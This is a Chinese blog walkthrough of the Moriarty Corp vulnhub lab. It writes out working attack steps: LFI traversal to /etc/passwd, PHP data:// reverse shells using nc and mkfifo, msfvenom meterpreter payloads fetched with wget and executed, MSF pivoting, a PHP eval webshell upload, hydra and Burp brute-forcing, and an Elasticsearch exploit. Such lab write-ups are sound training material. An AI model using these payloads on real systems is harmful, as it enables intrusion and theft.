---
layout: post
title: "打靶笔记-03-vulhub-Moriarty Corp"
date: "2022-03-16T16:26:07.677Z"
---
打靶笔记-03-vulhub-Moriarty Corp
============================

打靶笔记-03-vulhub-BoredHackerBlog
==============================

一、靶机信息
------

    Name: BoredHackerBlog: Moriarty Corp（中-高级难度）
    Date release: 29 Mar 2020
    Author: BoredHackerBlog
    Series: BoredHackerBlog
    

> 这个靶机下载页面有些提示，8000是提交flag的端口，没必要攻击，然后漏洞环境是安装在靶机的Docker中的，别的好像没了或者不太重要，可以按照完全啥也不知道进行打靶。

二、靶机启动
------

### 2.1 靶机hash校验

    sha1sum MoriartyCorp.ova   
    e9874e51a2645c1b61a3afc771aa5abdc94bf264  MoriartyCorp.ova
    

### 2.2 导入Virtualbox，并配置网络

这个靶机依然是适用于Vbox，而我攻击机器是在Vmware上搭建的，所以还是将Vbox的网络桥接到vmnet8上，使其处于一个网段，实战中这块无需多虑。  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204206732-398275234.png)

### 2.3 启动靶机

为了以防万一，打个快照，启动靶机开始练习  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204207158-1806519214.png)

三、开始打靶
------

### 3.1 获取靶机IP

#### 3.1.1 攻击机IP以及网卡信息

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204207607-1568167414.png)

#### 3.1.2 主机发现

    sudo arp-scan -I eth0 -l
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204207870-1978522660.png)  
**成功获取靶机IP为172.16.95.139**

### 3.2 端口&服务扫描

#### 3.2.1 扫描开放端口

    sudo nmap -p- 172.16.95.139
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204208159-1410759595.png)  
**发现开放端口22、8000、9000**

#### 3.2.2 确认端口所对应服务

按照惯例，对端口后面的服务进一步确认

    sudo nmap -p22,8000,9000 -sV 172.16.95.139
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204208391-775779530.png)  
**可以看到分别是SSH、PythonWeb框架Werkzeug、Portainer Docker UI控制界面**  
搞到这儿，就可以有多条向下的思路  
1\. 爆破ssh  
2\. Portainer 1.19.2 是否有漏洞，它上面搭建的Application是否有web漏洞  
3\. Portainer 1.19.2 的漏洞利用  
可以利用nmap或其他工具进行漏洞扫描测试，这里简单利用nmap的脚本扫描了一下，都没发现漏洞，所以可以先去访问下靶机提示的提交flag的8000端口。

### 3.3 访问8000端口

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204208622-1499186366.png)

#### 3.3.1 开局

这个靶机的一切都从这里开始进入，先键入**flag{start}**进入第一关  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204208920-1740622151.png)  
提示**80端口**，刚刚端口扫描没发现，现在重新扫描一遍  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204209201-1188954551.png)  
果然开放了，看起来这个靶机是一关一关开放的，那就开始第一关吧。

#### 3.3.2 第一关

访问80端口，直接搞开网页源代码  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204209471-1861429427.png)  
发现这个页面比较简单，有点用处的就是两个链接，看到接收参数是file，而且值是个文件，我们有理由联想到**文件包含**，而且**文件名可控**，不过不知道路径可不可控，可以试一试，结合之前端口服务扫描确定的操作系统为linux，所以：

    /?file=../../../../../../etc/passwd
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204209923-42803824.png)  
发现路径参数也可控，所以存在**本地文件包含漏洞（LFI）**，而且包含的是敏感型文件，说明还存在**目录遍历漏洞**  
所以接下来就好玩了，可以包含任意文件，那就也可以是webshell，然后用蚁剑或冰蝎等进行连接，但前提是判断**服务器语言环境**以及找到**上传webshell的地方**

1.  **后端环境为php环境**  
    简单判断了一下，或者也可以用Wappalyzer等插件确定  
    ![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204210412-296849994.png)
2.  **上传webshell的地方**  
    这个地方，可以通过污染日志文件的方式达到目的

    ssh '<?php phpinfo();?>'@172.16.95.139
    ssh '<?php system($_GET['shell']); ?>'@172.16.95.139
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204210685-647760473.png)  
这个肯定连接不上，因为压根没有这个用户名，但这里目的是为了污染ssh的连接日志文件。  
为了验证是否成功污染，之前污染了phpinfo的内容进入日志，可以先包含一下看看：

    ?file=../../../../../../var/log/auth.log
    

_**最后好像失败了，应该是没有被污染，没想明白，这里记录一下，一会儿打进去看一下；**_

> 一会儿找到答案后记录在此  
> 第一关打入进去之后，发现就没有此日志文件，后来才明白过来，这是个容器，而ssh的端口是宿主机的，然而宿主机的80端口映射到了容器中，这个漏洞网站是运行在容器中的，打死也包含不上啊，=-=

这里利用**伪协议**再次尝试:  
首先是用了data伪协议：

    ?file=data:// text/plain,<?php phpinfo();?>
    ?file=data:// text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204211018-2079246692.png)  
成功！！！那就可以使用data协议进行反弹shell了，如下是代码（一定要记得URL编码，否则代码中的一些字符例如&会被浏览器解析而无法进入后台执行）：  
**开启nc进行监听**

    nc -lnvp 6666
    

**反弹shell**

    ?file=data://text/plain,<?php %24sock%3dfsockopen("172.16.95.133","6666")%3bexec(%22%2fbin%2fsh%20-i%20%3c%263%20%3e%263%202%3e%263%22)%3b?>
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204211361-959418051.png)  
直接执行php的反弹代码，结果一闪而过，应该是代码执行后就进行内存回收了，所以无法持续链接。所以需要可以采用如下的办法实现：

    ?file=data://text/plain,<?php $var=shell_exec($_GET['d']);echo $var;?>&d=rm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh%20-i%202%3e%261%7cnc%20172.16.95.133%206666%20%3e%2ftmp%2ff
    
    // 或者采用base64转换后：
    ?file=data://text/plain;base64,
    PD9waHAgJHZhcj1zaGVsbF9leGVjKCRfR0VUWydkJ10pO2VjaG8gJHZhcjs/Pg==&d=rm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh%20-i%202%3e%261%7cnc%20172.16.95.133%206666%20%3e%2ftmp%2ff
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204211672-748531862.png)  
**成功拿到第一个flag**，然后也提示了下一关信息是个内网  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204211994-885636473.png)  
3\. **总结**  
反弹shell的shell\_exec()函数可以自由更换，比如system()，还可以尝试其他协议，比如http的方式进行远程包含  
不过这里有个坑，如下：  
首先在远程服务器(这里直接以kali为例)上放置需要包含的文件

    cd /var/www/html/
    sudo echo '<?php phpinfo();?>' ./1.txt
    sudo cp 1.txt 1.php
    

进行远程文件包含

    ?file=http://172.16.95.133/1.txt
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204212291-655435075.png)  
这而是先将1.txt的内容**包含到了靶机上进行执行**  
进行如下远程包含

    ?file=http://172.16.95.133/1.php
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204212578-996426360.png)  
这是在远程服务器上执行后将**执行后的html响应内容**进行了包含  
所以如果想要利用http的方式进行远程文件包含（RFI），要注意分辨包含的内容是什么，要进行反弹shell的话可以将如下下载到的php文件修改后缀名后挂载到远程服务器上再进行包含，否则拿到的shell就是自己远程服务器的shell  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204212861-32952531.png)  
如果不改后缀名的话，拿到的shell就是自己远程服务器的shell，如下就搞笑了：  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204213124-44898856.png)  
好了，这就开始进入第二关。。。

#### 3.3.3 第二关

根据提示，这个服务器上（docker容器）没有任何信息，需要进一步内网渗透，也提示了内网网段172.17.0.3-254（也可以自己收集到）  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204213397-2111381019.png)  
但是接下来，要进行内网渗透，**攻击机器必须能够访问到内网网段**

两种办法

*   利用第一关拿到的shell提权，然后搞一堆攻击工具下来，远程操作，不过这个很不现实，基本可以放弃了
*   利用第一关拿到的shell建立隧道，使得外网的攻击机器能够访问目标内网，这个可行，建立隧道的方式有很多种，我这里选择美少妇（MSF），回头尝试一下其他的方式并比较记录下来

##### 3.3.3.1 建立隧道

1.  开启msf，并开始监听，准备接收shell
    
        msfconsole
        use exploit/multi/handler
        set payload linux/x64/meterpreter_reverse_tcp
        show options
        set lhost 172.16.95.133
        set lport 8888
        run
        
    
    ![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204213640-256596114.png)
    
2.  msfvenom生成相应的payload
    
        msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=172.16.95.133 lport=8888 -f elf >shell.elf
        
    
    ![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204213960-2041751973.png)
    
3.  利用第一关的shell将生成的payload下载到目标机器执行进行上线
    
        cd /tmp
        wget http://172.16.95.133/shell.elf
        chmod +x shell.elf
        ./shell.elf
        
    
    ![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204214190-540861074.png)  
    **成功上线**  
    ![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204214441-1012468520.png)
    
4.  给获得的meterpreter添加内网路由
    
        route
        run autoroute -s 172.17.0.0/16
        background
        route print
        
    
    ![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204214686-2113072499.png)
    
5.  开启msf的代理服务端功能
    
        sessions
        use auxiliary/server/socks_proxy
        show options
        run
        
    
    ![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204215024-823562947.png)
    
6.  配置proxychains以使用代理
    
        sudo vim /etc/proxychains4.conf
        
    
    将msf的代理服务器地址写入  
    ![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204215386-672268681.png)
    
7.  测试隧道是否成功  
    ![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204215659-2012374996.png)  
    可以看到隧道已经建立成功
    

##### 3.3.3.2 开始主机发现

    proxychains nmap -p80,22,443 172.17.0.3-254
    

注意这里有个坑，就是走proxychains时最好用普通用户，我用root用户好像没扫出有效结果，不知道为啥。

> 之后找到答案，写在这里

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204215935-1229885288.png)  
**成功发现一台主机172.17.0.4开放了80端口**

##### 3.3.3.3 配置火狐代理访问内网

发现内网有一台主机开放了80端口，所以可以访问一下，但是浏览器也必须走socks5代理才可以，如下配置  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204216266-426931855.png)  
如下已经成功访问到，可以看出是一个文件上传的页面，看到文件上传就嘿嘿嘿了，不过貌似上传要密码  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204216507-1700519905.png)  
或者还可以使用如下命令启动firefox，也可以访问到内网web应用

    proxychains firefox 172.17.0.4
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204216744-1750797350.png)

##### 3.3.3.4 文件上传利用

可以看到这个页面上传文件需要密码，那就只能爆破了，要想爆破就得抓包，所以必须得先让浏览器的包先到burp，然后burp挂着代理去和内网通信  
**浏览器=\>Burp代理\=>socks代理===>内网**  
所以需要做的就是浏览器设置代理到burp，然设置burp的socks代理，如下：

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204216986-2123394039.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204217218-1449862628.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204217449-1078344841.png)  
到此就搭建好了，然后开始上传文件，爆破密码

1.  这里打算上传webshell，先随便输入密码如下：

    echo '<?php @eval($_POST['ant']);?>' > shell.php
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204217730-1803663610.png)  
2\. burp拦截并发送到intruder进行密码破解：  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204217969-1789262313.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204218290-960347232.png)  
这里字典选择了rockyou，kali自带的很大的字典  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204218591-1505454549.png)  
然后就可以暴力破解了  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204219164-1927346675.png)  
没一会儿就找到了到密码，是password，上传之后shell.php的地址是./photo/22/shell.php  
3\. 上传成功，使用蚁剑链接，蚁剑也需要配置socks5代理  
设置代理  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204219404-1409753732.png)  
链接shell，这里没有自定义UA，可以在请求信息或者js文件中进行修改  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204219679-1767218241.png)

##### 3.3.3.5 寻找flag

最终在根目录下找到第二个flag：2\_flag.txt  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204219961-1330902136.png)  
提交之后开启第三关  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204220253-534690966.png)

#### 3.3.4 第三关

根据提示信息，这关拿到了一些账户以及这些账户的hash，但是不知道具体哪个机器的ssh连接账户，先把账户记录和密码hash破解记录下来，分别保存为**user.txt、password.txt**  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204220541-872479852.png)

1.  扫描内网开放了22端口的主机，如果对方ssh服务没有更改端口号的话就是默认22

    proxychains nmap -Pn -sT -p22 172.17.0.3-254
    
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204220876-1662393387.png)  
2\. 然后发现新的主机172.17.0.5开放了22端口，然后调用hydra进行尝试登陆破解

    proxychains hydra -L user.txt -P password.txt
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204221335-2109421550.png)  
很快就找到了**ssh登陆账户root密码weapons**  
3\. 开始尝试ssh连接  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204221668-2036140978.png)  
4\. 获取3\_flag.txt并提交  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204221959-1821211781.png)  
根据提示进入第四关，目标内网还搭建有聊天系统，可能在**443、8000、8080、8888**四个端口，然后还获得**聊天系统的账户buyer13密码arms13**

#### 3.3.5 第四关

1.  开始扫描443、8000、8080、8888端口开放主机

    proxychains nmap -Pn -sT -p443,8000,8080,8888 172.17.0.3-254
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204222330-465820181.png)  
**发现172.17.0.6的主机8000端口开放**  
2\. 访问http://172.17.0.6:8000  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204222554-1169568703.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204222807-1482460338.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204223105-1756124387.png)  
通过分析**Chats**中的内容，可以发现对方**管理员账户为admin**  
3\. 逻辑漏洞修改管理员密码  
可以发现有一个Change Password的页面，访问一下，发现不用验证旧密码，先提交抓包看看  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204223346-647738692.png)  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204223568-1738710944.png)  
发现果然不需要旧密码，也没有验证码，判断这边是一个**任意密码修改的逻辑漏洞**  
然后尝试将用户名修改为admin，放包，如果能够修改成功，则应该存在一个**越权逻辑漏洞**  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204223800-485557687.png)  
最后成功登陆admin  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204224102-335438727.png)  
在admin的Chats中发现了新的flag  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204224324-1164035078.png)  
4\. 提交flag进入下一关  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204224557-2060812603.png)  
还提示内网还有一个**Elasticsearch**

#### 3.3.6 第五关

Elasticsearch的默认端口是9200

1.  扫描内网开放了9200端口的主机

    proxychains nmap -Pn -sT -p9200 172.17.0.3-254
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204224951-1755319939.png)  
很快就发现了**主机172.17.0.7开放了9200**，很可能就部署在这台服务器上  
2\. 访问http://172.17.0.7:9200  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204225271-620501035.png)  
果然，拿到了这个服务的一些信息  
3\. 搜寻Elasticsearch的历史漏洞信息

    searchsploit Elasticsearch
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204225537-230052480.png)  
然后就挨个尝试吧  
4\. 漏洞利用  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204225810-1818184185.png)

    proxychains python2 36337.py 172.17.0.7
    

![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204226158-1302283436.png)  
5\. 提交flag，结束  
![Img](https://img2022.cnblogs.com/blog/2361096/202203/2361096-20220316204226410-1795167736.png)

四、总结
----

这个靶机从开始的**文件包含**各种姿势反弹shell开始，涉及到了**内网隧道搭建**，**任意修改密码，越权等逻辑漏洞**等，练习了反弹shell的姿势、msf的使用、burp联动二级代理以及漏洞查找思路等。  
下次可以用下venom，据说也很好用。  
这次没怎么涉及到免杀和绕过，将基本思路形成肌肉记忆后，需要再免杀和绕过上练习练习，毕竟之后实际环境不像靶机，不怎么设置waf和杀毒。

本文来自博客园，作者：[WTHusky](https://www.cnblogs.com/wthuskyblog/)，转载请注明原文链接：[https://www.cnblogs.com/wthuskyblog/p/16014392.html](https://www.cnblogs.com/wthuskyblog/p/16014392.html)